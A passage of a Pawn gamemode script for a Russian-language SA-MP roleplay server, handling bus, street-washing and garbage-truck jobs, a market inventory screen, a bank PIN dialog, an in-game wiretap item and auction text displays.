						SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy1[GetPVarInt(playerid,"Check")][0], Gorodskoy1[GetPVarInt(playerid,"Check")][1], Gorodskoy1[GetPVarInt(playerid,"Check")][2], Gorodskoy1[GetPVarInt(playerid,"Check")+1][0], Gorodskoy1[GetPVarInt(playerid,"Check")+1][1], Gorodskoy1[GetPVarInt(playerid,"Check")+1][2], 5);
				    }
				    else
				    {
				        DisablePlayerRaceCheckpoint(playerid);
				        TogglePlayerControllable(playerid,0);
				        ProxDetector(10.0, playerid, "Остановка 15 секунд. Маршрут: №18 - ЖД Вокзал - Автошкола",CREWARD);
				        SetTimerEx("BusTimer", 15000, false, "i", playerid);
				    }
			    }
			    case 2:
			    {
			        PlayerInfo[playerid][pPayDay] += 5;
				    if(floatround(Gorodskoy2[GetPVarInt(playerid,"Check")][3]) == 0)
				    {
				        SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
				        if(GetPVarInt(playerid,"Check") == 56) {
							SetPVarInt(playerid,"Check",0);
							if(!PlayerInfo[playerid][pQuestS][4])
							{
								PlayerQuest[playerid][4][0] ++;
								CheckQuest(playerid,4);
							}
							if(PlayerInfo[playerid][pQuest] == 2) PlayerInfo[playerid][pQ][0]++;
						}
						SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy2[GetPVarInt(playerid,"Check")][0], Gorodskoy2[GetPVarInt(playerid,"Check")][1], Gorodskoy2[GetPVarInt(playerid,"Check")][2], Gorodskoy2[GetPVarInt(playerid,"Check")+1][0], Gorodskoy2[GetPVarInt(playerid,"Check")+1][1], Gorodskoy2[GetPVarInt(playerid,"Check")+1][2], 5);
				    }
				    else
				    {
				        DisablePlayerRaceCheckpoint(playerid);
				        TogglePlayerControllable(playerid,0);
				        ProxDetector(10.0, playerid, "Остановка 15 секунд. Маршрут: №36 - Аэропорт - Автошкола",CREWARD);
				        SetTimerEx("BusTimer", 15000, false, "i", playerid);
				    }
			    }
			    case 3:
			    {
			        PlayerInfo[playerid][pPayDay] += 5;
				    if(floatround(Gorodskoy3[GetPVarInt(playerid,"Check")][3]) == 0)
				    {
				        SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
				        if(GetPVarInt(playerid,"Check") == 51)
						{
							SetPVarInt(playerid,"Check",0);
							if(!PlayerInfo[playerid][pQuestS][4])
							{
								PlayerQuest[playerid][4][0] ++;
								CheckQuest(playerid,4);
							}
							if(PlayerInfo[playerid][pQuest] == 2) PlayerInfo[playerid][pQ][0]++;
						}
						SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy3[GetPVarInt(playerid,"Check")][0], Gorodskoy3[GetPVarInt(playerid,"Check")][1], Gorodskoy3[GetPVarInt(playerid,"Check")][2], Gorodskoy3[GetPVarInt(playerid,"Check")+1][0], Gorodskoy3[GetPVarInt(playerid,"Check")+1][1], Gorodskoy3[GetPVarInt(playerid,"Check")+1][2], 5);
				    }
				    else
				    {
				        DisablePlayerRaceCheckpoint(playerid);
				        TogglePlayerControllable(playerid,0);
				        ProxDetector(10.0, playerid, "Остановка 15 секунд. Маршрут: №42 - Отель - Автошкола",CREWARD);
				        SetTimerEx("BusTimer", 15000, false, "i", playerid);
				    }
			    }
		    }
	    }
	}
	else if(GetPVarInt(playerid,"Mar") == 6)
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 574)
	    {
	        if(BInfo[GetPlayerVehicleID(playerid)][bWork] > 0)
	        {
	            PlayerInfo[playerid][pPayDay] += 4;
  				new ob = CreateDynamicObject(18707,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ob, GetPlayerVehicleID(playerid), 0.639, 1.710, -1.740, 0.000, 0.000, 0.000);
			    SetPVarInt(playerid,"Object1",ob);
			    ob = CreateDynamicObject(18707,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ob, GetPlayerVehicleID(playerid), -0.609, 1.750, -1.840, 0.000, 0.000, 0.000);
			    SetPVarInt(playerid,"Object2",ob);
			    SetPVarInt(playerid,"SpeedLimit",1);
	        }
	        else
			{
			    DisablePlayerRaceCheckpoint(playerid);
			    GameTextForPlayer(playerid, "~G~WAIT 5 SECONDS....", 5000, 1);
			    TogglePlayerControllable(playerid, 0);
				SetTimerEx("ZapravkaVod",5000,false,"i",playerid);
			}
		}
	}
	else if(GetPVarInt(playerid,"Mar") == 7)
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 408)
	    {
	        if(BInfo[GetPlayerVehicleID(playerid)][bWork] < 100)
	        {
	            if(!GetPVarInt(playerid,"InJob"))
	            {
	         //		new Float:angle = GetVehicleAngleToPoint(GetPlayerVehicleID(playerid), MusorPos[GetPVarInt(playerid,"Check")][0], MusorPos[GetPVarInt(playerid,"Check")][1]);
				//	if( (angle >= -220 && angle <= -140) || (angle >= 140 && angle <= 220) )
				//	{
//					    new carid = GetPlayerVehicleID(playerid);
					//	SetVehicleVelocity(GetPlayerVehicleID(playerid),0.0,0.0,0.0);
					//	GameTextForPlayer(playerid, "~G~WAIT....", 5000, 1);
						SendClientMessage(playerid,-1,"Подойтие к мусороному контейнеру, чтобы взять мусор. Используйте: {f7ae11}LALT");
						SetPVarInt(playerid,"InJob",1);
					 /*   TogglePlayerControllable(playerid, 0);
					    new Float:X, Float:Y, Float:Z, Float:A;
						new Float:oX, Float:oY, Float:oZ;
						GetVehicleZAngle(carid, A);
						GetVehicleShiftPos(carid, 1, X, Y, Z, 7.0);
						GetVehicleShiftPos(carid, 1, oX, oY, oZ, 3.3);
						DestroyDynamicObject(MusorObject[GetPVarInt(playerid,"Check")]);
			
						new obj1 = CreateDynamicObject(1334, X, Y, Z, 100, 0, A);
						Streamer_UpdateEx(playerid,X, Y, Z,-1,-1);

						SetPVarInt(playerid,"MusObj1",obj1);
						SetPVarInt(playerid,"InJob",1);
						MoveDynamicObject(obj1, X, Y, Z-0.005, 0.001, 20, 0, A);
						SetPVarInt(playerid,"RemoveObject",1);
						SetVehiclePos(carid, oX, oY, oZ);
						SetTimerEx("StopMusor", 4500, false, "di", playerid, obj1);*/
					//	SetTimerEx("MusorUp",5000,false,"i",playerid);

				//	}
				//	else SendClientMessage(playerid, CGREY, "Вы должны подъехать задом");
				}
 				
	        }
	        else
			{
			    DisablePlayerRaceCheckpoint(playerid);
			    GameTextForPlayer(playerid, "~G~WAIT 5 SECONDS....", 5000, 1);
			    TogglePlayerControllable(playerid, 0);
				SetTimerEx("RazVod",5000,false,"i",playerid);
			}
		}
	}
	return 1;
}

	
/*function RemovingObject(musor, carid, playerid)
{
	new objectid = GetPVarInt(playerid,"MusObj1");
	new Float:X[2], Float:Y[2], Float:Z[2];
	GetDynamicObjectPos(objectid, X[0], Y[0], Z[0]);
	GetDynamicObjectRot(objectid, X[1], Y[1], Z[1]);
	MoveDynamicObject(objectid, X[0], Y[0], Z[0]+0.005, 0.001, 130, 90, Z[1]);
	SetTimerEx("StopMusor", 4000, false, "i", objectid);
	DeletePVar(playerid,"RemoveObject");
	DeletePVar(playerid,"InJob");
	DisablePlayerRaceCheckpoint(playerid);
    TogglePlayerControllable(playerid, 1);
    new i = GetPVarInt(playerid,"Check");
	if(MusorCount[i] >= 50) MusorCount[i] -= 50;
	else MusorCount[i] = 0;
	new string[40];
	format(string, sizeof(string), "Мусор: {f7ae11}%d/100%", MusorCount[i]);
	UpdateDynamic3DTextLabelText(MusorText[i], -1, string);
    BInfo[GetPlayerVehicleID(playerid)][bWork] += 10;
    new str[50];
	format(str,sizeof(str),"Загруженно: {f7ae11}%d/100%",BInfo[GetPlayerVehicleID(playerid)][bWork]);
	UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	if(BInfo[GetPVarInt(playerid,"Bus")][bWork] < 100)
	{
	    SendClientMessage(playerid,CGREEN,"Отправляйтесь к следующему мусорному контейнеру!");
	    SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
	    new rand = GetMusor(playerid);
		SetPVarInt(playerid,"Check",rand);
		SetPlayerRaceCheckpoint(playerid, 1, MusorPos[rand][0], MusorPos[rand][1], MusorPos[rand][2], 0.0,0.0,0.0, 8);
	}
	else
	{
	    SendClientMessage(playerid,CGREEN,"Транспорт загружен! Отправляйтесь на место разгрузки");
	    SetPlayerRaceCheckpoint(playerid, 1, 64.8071,-289.0333,2.1295, 0.0,0.0,0.0, 8);
	}
	return true;
}
GetVehicleShiftPos(vehicleid, style, &Float:x, &Float:y, &Float:z, Float:distance)
{
	new Float:a;
	GetVehiclePos(vehicleid, x, y, z);
	GetVehicleZAngle(vehicleid, a);
	switch(style)
	{
	case 0:
		{
			x += (distance * floatsin(-a, degrees));
			y += (distance * floatcos(-a, degrees));
		}
	case 1:
		{
			x -= (distance * floatsin(-a, degrees));
			y -= (distance * floatcos(-a, degrees));
		}
	case 2:
		{
			a += 90.0;
			x -= (distance * floatsin(-a, degrees));
			y -= (distance * floatcos(-a, degrees));
		}
	case 3:
		{
			a -= 90.0;
			x -= (distance * floatsin(-a, degrees));
			y -= (distance * floatcos(-a, degrees));
		}
	default: return false;
	}
	return true;
}
stock DetachMusor(playerid,vehicleid)
{
	if(!IsValidVehicle(vehicleid)) return true;
	if(PlayerInfo[playerid][pJob] != 7) return true;
	if(GetPVarInt(playerid,"Check"))
	{
	//	NowMusor[vehicleid] = -1;
	//	MusorCar[musor] = -1;
		StopDynamicObject(GetPVarInt(playerid,"MusObj1"));
	//	TempMusorMusor[TempMusorObject[musor]] = -1;
		DestroyDynamicObject(GetPVarInt(playerid,"MusObj1"));

		DeletePVar(playerid,"MusObj1");
		DeletePVar(playerid,"RemoveObject");
		MusorObject[GetPVarInt(playerid,"Check")] = CreateDynamicObject(1334, MusorPos[GetPVarInt(playerid,"Check")][0], MusorPos[GetPVarInt(playerid,"Check")][1], MusorPos[GetPVarInt(playerid,"Check")][2], 0, 0, MusorPos[GetPVarInt(playerid,"Check")][3]);
        Streamer_UpdateEx(playerid,MusorPos[GetPVarInt(playerid,"Check")][0], MusorPos[GetPVarInt(playerid,"Check")][1], MusorPos[GetPVarInt(playerid,"Check")][2],-1,-1);
	}
	return true;
}
function StopMusor(playerid,objectid)
{
	if(GetPVarInt(playerid,"MusObj1"))
	{
		if(objectid == GetPVarInt(playerid,"MusObj1"))
		{
			if(GetPVarInt(playerid,"RemoveObject"))
			{
				SetTimerEx("RemovingObject", 3000, false, "iii", GetPVarInt(playerid,"Check"), GetPlayerVehicleID(playerid), playerid);

			}
			else
			{
				if(GetPVarInt(playerid,"InJob"))
				{
				    DeletePVar(playerid,"InJob");
					TogglePlayerControllable(playerid, true);
					if(BInfo[GetPVarInt(playerid,"Bus")][bWork] >= 100)
					{
						SendClientMessage(playerid,CGREEN,"Транспорт загружен! Отправляйтесь на место разгрузки");
	    				SetPlayerRaceCheckpoint(playerid, 1, 64.8071,-289.0333,2.1295, 0.0,0.0,0.0, 5);
					}
				}
				DetachMusor(playerid,GetPlayerVehicleID(playerid));
			}
		}
	}
	return true;
}*/

new housez[200];
public OnPlayerLeaveRaceCheckpoint(playerid)
{
    if(GetPVarInt(playerid,"Mar") == 6)
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 574)
	    {
	        if(BInfo[GetPlayerVehicleID(playerid)][bWork] > 0)
	        {
				if(GetPVarInt(playerid,"Object1")) DestroyDynamicObject(GetPVarInt(playerid,"Object1"));
				if(GetPVarInt(playerid,"Object2")) DestroyDynamicObject(GetPVarInt(playerid,"Object2"));
				DeletePVar(playerid,"Object1");
				DeletePVar(playerid,"Object2");
	            DisablePlayerRaceCheckpoint(playerid);
	            DeletePVar(playerid,"SpeedLimit");

	            BInfo[GetPlayerVehicleID(playerid)][bWork]--;
	            new str[50];
	        	format(str,sizeof(str),"Загруженно: {f7ae11}%d/10 л.",BInfo[GetPlayerVehicleID(playerid)][bWork]);
				UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str);
				switch(BInfo[GetPlayerVehicleID(playerid)][bWork])
				{
				    case 0:
				    {
				        SetPlayerRaceCheckpoint(playerid, 0, 155.2619,-287.9157,1.3033, 0.0,0.0,0.0, 5);
				        SendClientMessage(playerid,CGREEN,"В транспорте закончилась вода! Отправляйтесь на станцию дозаправки");
				    }

				    case 1..35:
				    {
				        SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
				        if(GetPVarInt(playerid,"Check") == 69)
						{
						    if(!PlayerInfo[playerid][pQuestS][4])
							{
								PlayerQuest[playerid][4][3]++;
								CheckQuest(playerid,4);
							}
							SetPVarInt(playerid,"Check",0);
						}
				        if(GetPVarInt(playerid,"GorodCh") == 1) SetPlayerRaceCheckpoint(playerid, 0, WashLosSantos[GetPVarInt(playerid,"Check")][0], WashLosSantos[GetPVarInt(playerid,"Check")][1], WashLosSantos[GetPVarInt(playerid,"Check")][2], WashLosSantos[GetPVarInt(playerid,"Check")+1][0], WashLosSantos[GetPVarInt(playerid,"Check")+1][1], WashLosSantos[GetPVarInt(playerid,"Check")+1][2], 5);
						else SetPlayerRaceCheckpoint(playerid, 1, WashLasVenturas[GetPVarInt(playerid,"Check")][0], WashLasVenturas[GetPVarInt(playerid,"Check")][1], WashLasVenturas[GetPVarInt(playerid,"Check")][2], WashLasVenturas[GetPVarInt(playerid,"Check")+1][0], WashLasVenturas[GetPVarInt(playerid,"Check")+1][1], WashLasVenturas[GetPVarInt(playerid,"Check")+1][2], 5);
				    }
				}
	        }
			
		}
	}
	return 1;
}
forward RazVod(playerid);
public RazVod(playerid)
{
    TogglePlayerControllable(playerid, 1);
    BInfo[GetPlayerVehicleID(playerid)][bWork] = 0;
    UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"Загруженно: {f7ae11}0/100%");
    SendClientMessage(playerid,CGREEN,"Транспорт разгружен! Отправляйтесь к мусорному контейнеру");
	new rand = GetMusor(playerid);
	//	if(GetPVarInt(playerid,"GorodCh") == 1) rand = random(143);
	//	else rand = random(177)+144;
	SetPVarInt(playerid,"Check",rand);
	SetPlayerRaceCheckpoint(playerid, 1, MusorPos[rand][0], MusorPos[rand][1], MusorPos[rand][2], 0.0,0.0,0.0, 8);
 /*   new rand;
	if(GetPVarInt(playerid,"GorodCh") == 1) rand = random(143);
	else rand = random(177)+144;
	SetPVarInt(playerid,"Check",rand);
	SetPlayerRaceCheckpoint(playerid, 1, MusorPos[rand][0], MusorPos[rand][1], MusorPos[rand][2], 0.0,0.0,0.0, 5);*/
    return 1;
}
forward ZapravkaVod(playerid);
public ZapravkaVod(playerid)
{
    TogglePlayerControllable(playerid, 1);
    BInfo[GetPlayerVehicleID(playerid)][bWork] = 10;
    UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,"Загруженно: {f7ae11}10/10 л.");
    SendClientMessage(playerid,CGREEN,"Транспорт заправлен! Отправляйтесь на место чистки");
    if(GetPVarInt(playerid,"GorodCh") == 1) SetPlayerRaceCheckpoint(playerid, 0, WashLosSantos[GetPVarInt(playerid,"Check")][0], WashLosSantos[GetPVarInt(playerid,"Check")][1], WashLosSantos[GetPVarInt(playerid,"Check")][2], WashLosSantos[GetPVarInt(playerid,"Check")+1][0], WashLosSantos[GetPVarInt(playerid,"Check")+1][1], WashLosSantos[GetPVarInt(playerid,"Check")+1][2], 5);
	else SetPlayerRaceCheckpoint(playerid, 0, WashLasVenturas[GetPVarInt(playerid,"Check")][0], WashLasVenturas[GetPVarInt(playerid,"Check")][1], WashLasVenturas[GetPVarInt(playerid,"Check")][2], WashLasVenturas[GetPVarInt(playerid,"Check")+1][0], WashLasVenturas[GetPVarInt(playerid,"Check")+1][1], WashLasVenturas[GetPVarInt(playerid,"Check")+1][2], 5);
    return 1;
}
public OnRconCommand(cmd[])
{
	return 1;
}


public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}


public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, PickupInfo[pickupid][PickX], PickupInfo[pickupid][PickY], PickupInfo[pickupid][PickZ])) return true;
	if(pickupid == oldpickup[playerid]) return true;
	oldpickup[playerid] = pickupid;
	new Float:z;
	GetPlayerPos(playerid, PickupX[playerid], PickupY[playerid], z);
	if(pickupid >= pdlift[0] && pickupid <= pdlift[2])
	{
		if(GetPVarInt(playerid,"FloodLift") > gettime()) return 1;
		if((PlayerInfo[playerid][pMember] == F_LSPD && GetPlayerVirtualWorld(playerid) == 17) ||
		(PlayerInfo[playerid][pMember] == F_LVPD && GetPlayerVirtualWorld(playerid) == 1))
		{
	        if(pickupid == pdlift[0]) SetPVarInt(playerid,"Etaz",3);
	        else if(pickupid == pdlift[1])  SetPVarInt(playerid,"Etaz",2);
	        else if(pickupid == pdlift[2]) SetPVarInt(playerid,"Etaz",1);
			ShowPlayerDialog(playerid,368,DIALOG_STYLE_LIST,"Лифт","Крыша\n3 этаж\n2 этаж\n1 этаж\nПарковка","Далее","Отмена");
		}
	}
	if(pickupid == torgpic && !GetPVarInt(playerid,"OpenTorg"))
	{
	    CreateInv(playerid);
        CreateTrunk(playerid);
		TextDrawSetString(Inventory1[4],"MARKET");

		for(new i = 0; i < 16; i++)
		{
	 		if(i < 15) TextDrawShowForPlayer(playerid,Inventory[i]);
	 		TextDrawShowForPlayer(playerid,Inventory1[i]);
		}
		TextDrawShowForPlayer(playerid,Inventory[22]);
		new weapons[7],ammo[7];
		new str[5];
		new gun;
		for (new i = 0; i < 7; i++) GetPlayerWeaponData(playerid, i, weapons[i], ammo[i]);
		for(new i = 0; i < 36; i++)
		{
		    if(TorgInfo[tSlot][i])
			{
				PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[TorgInfo[tSlot][i]][invObj]);
	            PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[TorgInfo[tSlot][i]][invRot][0], InvType[TorgInfo[tSlot][i]][invRot][1], InvType[TorgInfo[tSlot][i]][invRot][2], InvType[TorgInfo[tSlot][i]][invRot][3]);
	 			PlayerTextDrawShow(playerid,InvAmm1[playerid][i]);
	 			format(str,sizeof(str),"%d",TorgInfo[tKol][i]);
				PlayerTextDrawSetString(playerid,InvAmm1[playerid][i],str);
			}
			else
	 		{
	 		    PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[0][invObj]);
				PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
	 		}
		    if(i >= 0 && i<= 5)
		    {
		 	    if(ammo[i+1])
				{

					gun = GiveID(weapons[i+1]);
					PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[gun][invObj]);
 					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[gun][invRot][0], InvType[gun][invRot][1], InvType[gun][invRot][2], InvType[gun][invRot][3]);
					PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
		 			format(str,sizeof(str),"%d",ammo[i+1]);
					PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
		 	    }
		 	    else
		 	    {
					PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
		 	    }
		    }

		    if(i > 5 && i < 36)
		    {

		 	    if(InvInfo[playerid][iSlot][i-6])
		 	    {
		            PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invObj]);
		            PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invRot][0], InvType[InvInfo[playerid][iSlot][i-6]][invRot][1], InvType[InvInfo[playerid][iSlot][i-6]][invRot][2], InvType[InvInfo[playerid][iSlot][i-6]][invRot][3]);
		 	//		PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
		 			PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
		 			format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i-6]);
					PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
		 		}
		 		else
		 		{
		 		    PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
		 		}
			}
			PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
		}
		if(!PlayerInfo[playerid][pUl][2])
		{
		    TextDrawHideForPlayer(playerid,Inventory[5]);
		    TextDrawHideForPlayer(playerid,Inventory[6]);
		    TextDrawHideForPlayer(playerid,Inventory[7]);
		    TextDrawHideForPlayer(playerid,Inventory[8]);
		    TextDrawHideForPlayer(playerid,Inventory[9]);
		    TextDrawHideForPlayer(playerid,Inventory[10]);
			TextDrawHideForPlayer(playerid,Inventory[13]);
			TextDrawHideForPlayer(playerid,Inventory[14]);
		}
		TextDrawHideForPlayer(playerid,Inventory1[5]);
	    TextDrawHideForPlayer(playerid,Inventory1[6]);
	    TextDrawHideForPlayer(playerid,Inventory1[7]);
	    TextDrawHideForPlayer(playerid,Inventory1[8]);
	    TextDrawHideForPlayer(playerid,Inventory1[9]);
	    TextDrawHideForPlayer(playerid,Inventory1[10]);
		TextDrawHideForPlayer(playerid,Inventory1[13]);
		TextDrawHideForPlayer(playerid,Inventory1[14]);
		SetPVarInt(playerid,"OpenTorg",1);

		SelectTextDraw(playerid, 0xFFCC00FF);
		SendClientMessage(playerid,CGREY,"Для закрытия торговой площадки используйте кнопку 'ESC'");
	}
	if(pickupid == bankpic[0] || pickupid == bankpic[1])
	{
	    if(!PlayerInfo[playerid][pBankPin]) ShowPlayerDialog(playerid,374,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Придумайте 4-ех значный PIN-CODE:\n\n","Далее","Отмена");
	    else SendClientMessage(playerid,CGREY,"У Вас уже есть карта!");
	}
	if(pickupid == fbipros)
	{
	    if(PlayerInfo[playerid][pMember] != F_FBI) return 1;
		if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		if(!GetPVarInt(playerid,"WT")) return SendClientMessage(playerid,CGREY,"У Вас уже есть устройство прослушки");
		SetPVarInt(playerid,"WT",1);
		SendClientMessage(playerid,CREWARD,"Вы взяли устройство прослушки!");
		SendClientMessage(playerid,-1,"Для установки на базе организации банды/мафии используйте: {f7ae11}/wt");
		SendClientMessage(playerid,CREWARD,"Прослушивать можно в мобильном пункте ФБР");
		
	}

	if(pickupid == container)
	{
	    AuctionP[playerid][0] = CreatePlayerTextDraw(playerid,238.666671, 359.466644, "alex_light"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][0], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][0], 1);
		PlayerTextDrawColor(playerid,AuctionP[playerid][0], -1);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][0], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][0], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][0], 1);

		AuctionP[playerid][1] = CreatePlayerTextDraw(playerid,238.666671, 369.966644, "alex_light"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][1], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][1], 1);
		PlayerTextDrawColor(playerid,AuctionP[playerid][1], -1);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][1], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][1], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][1], 1);

		AuctionP[playerid][2] = CreatePlayerTextDraw(playerid,238.666671, 380.466644, "alex_light"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][2], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][2], 1);
		PlayerTextDrawColor(playerid,AuctionP[playerid][2], -1);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][2], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][2], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][2], 1);

		AuctionP[playerid][3] = CreatePlayerTextDraw(playerid,238.666671, 390.966644, "alex_light"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][3], 0.164333, 1.098073);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][3], 1);
		PlayerTextDrawColor(playerid,AuctionP[playerid][3], -1);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][3], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][3], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][3], 1);

		AuctionP[playerid][4] = CreatePlayerTextDraw(playerid,238.666671, 401.466644, "alex_light"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][4], 0.164333, 1.098073);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][4], 1);
		PlayerTextDrawColor(playerid,AuctionP[playerid][4], -1);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][4], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][4], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][4], 1);

		AuctionP[playerid][5] = CreatePlayerTextDraw(playerid,383.333374, 358.966613, "9.999.999"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][5], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][5], 2);
		PlayerTextDrawColor(playerid,AuctionP[playerid][5], -1936945921);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][5], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][5], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][5], 1);

		AuctionP[playerid][6] = CreatePlayerTextDraw(playerid,383.333374, 369.466613, "9.999.999"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][6], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][6], 2);
		PlayerTextDrawColor(playerid,AuctionP[playerid][6], -1936945921);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][6], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][6], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][6], 1);

		AuctionP[playerid][7] = CreatePlayerTextDraw(playerid,383.333374, 379.966613, "9.999.999"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][7], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][7], 2);
		PlayerTextDrawColor(playerid,AuctionP[playerid][7], -1936945921);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][7], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][7], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][7], 1);

		AuctionP[playerid][8] = CreatePlayerTextDraw(playerid,383.333374, 390.466613, "9.999.999"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][8], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][8], 2);
		PlayerTextDrawColor(playerid,AuctionP[playerid][8], -1936945921);
		PlayerTextDrawSetShadow(playerid,AuctionP[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid,AuctionP[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid,AuctionP[playerid][8], 255);
		PlayerTextDrawFont(playerid,AuctionP[playerid][8], 2);
		PlayerTextDrawSetProportional(playerid,AuctionP[playerid][8], 1);

		AuctionP[playerid][9] = CreatePlayerTextDraw(playerid,383.333374, 400.966613, "9.999.999"); // Text element
		PlayerTextDrawLetterSize(playerid,AuctionP[playerid][9], 0.164333, 1.098074);
		PlayerTextDrawAlignment(playerid,AuctionP[playerid][9], 2);
